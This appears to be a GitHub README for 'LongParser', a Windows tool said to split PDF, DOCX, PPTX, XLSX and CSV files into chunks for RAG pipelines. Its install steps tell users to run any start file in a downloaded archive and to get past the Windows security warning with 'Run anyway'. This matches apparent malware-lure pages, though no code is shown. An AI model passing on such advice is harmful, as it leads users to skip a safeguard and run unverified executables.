# 🧩 LongParser - Turn files into ready chunks

[![Download LongParser](https://img.shields.io/badge/Download%20LongParser-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rippledirham767/LongParser)

## 📄 What LongParser does

LongParser helps you turn documents into clean text chunks for AI tools and search systems. It works with PDF, DOCX, PPTX, XLSX, and CSV files.

You can use it to:
- break large files into smaller parts
- keep text in a format that works for RAG systems
- review parsed content with human input when needed
- run a FastAPI server for local or team use
- keep document data private on your own machine

## 💻 What you need

LongParser runs on Windows and works best on a modern PC.

Recommended setup:
- Windows 10 or Windows 11
- 8 GB RAM or more
- 2 GB free disk space
- Internet access for the first download
- A recent web browser
- Microsoft Edge, Chrome, or Firefox

For better results with scanned PDFs:
- a PDF reader
- OCR support in your system
- enough memory for large files

## ⬇️ Download LongParser

Visit this page to download and run LongParser:

[Open LongParser on GitHub](https://github.com/Rippledirham767/LongParser)

## 🛠️ How to install on Windows

Follow these steps on your Windows PC:

1. Open the download link above.
2. On the GitHub page, look for the latest release or the main project files.
3. Download the Windows package or source files provided there.
4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.
5. Open the extracted folder.
6. Look for an app file, setup file, or start file.
7. Double-click the file to run LongParser.

If Windows shows a security prompt:
- click **More info**
- then click **Run anyway** if you trust the file source

## 🚀 First run

When LongParser opens for the first time, you can start with a sample document.

Typical first use:
1. Choose a file such as PDF, DOCX, PPTX, XLSX, or CSV.
2. Load the file into LongParser.
3. Let the app read and split the content.
4. Review the chunks if the app shows a review screen.
5. Export the parsed output for use in your AI workflow.

If the app asks for a folder or output path:
- choose a folder you can find again, like **Documents** or **Desktop**
- keep the output files in one place for easy reuse

## 📚 File types LongParser handles

LongParser is built for common business and research files.

Supported file types:
- PDF for reports, papers, and scans
- DOCX for word processing files
- PPTX for slide decks
- XLSX for spreadsheets
- CSV for tables and exports

For scanned PDFs, the app can use OCR to read text from images inside the file.

## 🧠 How the parsing flow works

LongParser takes a document and turns it into smaller text units.

A simple flow looks like this:
1. Open a file
2. Extract text, tables, or slide content
3. Clean the content
4. Split it into chunks
5. Send the chunks to your AI or search tool

This helps when you want:
- better search results
- clean input for LLM tools
- easier retrieval in RAG pipelines
- less noise from long documents

## 🧩 Review and human checks

LongParser includes human-in-the-loop review for cases where you want to check the parsed text before use.

This is useful when:
- the file has bad scans
- tables need a quick check
- you want to confirm chunk breaks
- you need to catch missing text before sending data to an AI system

## 🗂️ Three-layer memory chat

LongParser also supports a three-layer memory chat model for document work.

This can help you:
- keep short-term context
- track session details
- retain useful document facts across steps

This is useful when you work with long files or many related documents in one session.

## 🔧 Basic use in a local workflow

A simple local workflow looks like this:
- open LongParser
- load one document
- parse it
- review the output
- export chunks
- use the output in your app, vector database, or chat tool

If you work with many files:
- store them in one folder
- use clear file names
- keep input and output folders separate

## 🌐 FastAPI server mode

LongParser includes a production FastAPI server for advanced use.

Use this when you want:
- a local API
- document parsing from another app
- batch processing
- a server that fits a RAG pipeline

A common setup is:
- one machine hosts the server
- another tool sends files or requests
- LongParser returns parsed chunks for downstream use

## 🧪 Best file tips

For clean output:
- use clear file names
- prefer text-based PDFs when you can
- avoid very large files in one run if your PC is low on memory
- check table-heavy spreadsheets after parsing
- use OCR only when the source file has scanned pages

If a document has mixed layout:
- test one file first
- review the first output
- adjust the chunk size if the app allows it

## 🧭 Common uses

People use LongParser for:
- document search
- RAG pipelines
- internal knowledge bases
- contract review
- report analysis
- slide and spreadsheet ingestion
- private AI document prep

It works well when you want to keep files on your own computer and avoid sending them to outside services

## ❓ Troubleshooting

If LongParser does not open:
- check that the file fully downloaded
- extract the zip file first if needed
- run the app from the extracted folder
- try a different browser if the download fails

If a PDF looks blank:
- the file may be scanned
- turn on OCR if the app provides that option
- try a text-based version of the file

If the app closes right away:
- restart Windows
- run the app again
- make sure required files stayed in the same folder

If output looks broken:
- check the source file quality
- try a smaller document
- inspect tables, images, and headers in the result

## 🔒 Privacy and local control

LongParser is built for privacy-first document work.

That means you can:
- keep files on your own device
- control what gets sent to other tools
- review content before reuse
- avoid uploading sensitive documents when you do not need to

## 📦 Suggested folder setup

Use a simple folder layout like this:
- `LongParser`
- `Input Files`
- `Output Files`
- `Exports`

This makes it easier to:
- find source files
- compare parsed results
- keep project files organized
- reuse chunks in later work

## 🖥️ If you want to use it with other tools

LongParser can fit into a larger AI setup.

You can connect it with:
- vector databases
- chat apps
- retrieval tools
- workflow scripts
- document review systems

This is useful when you want parsed text to move from files into search or answer generation

## 📘 Repository link

Open the project page here:

[https://github.com/Rippledirham767/LongParser](https://github.com/Rippledirham767/LongParser)

## ✅ Quick start for Windows

1. Open the GitHub link.
2. Download the project files.
3. Extract the archive if needed.
4. Open the app or start file.
5. Load a PDF, DOCX, PPTX, XLSX, or CSV file.
6. Parse the document.
7. Review and export the chunks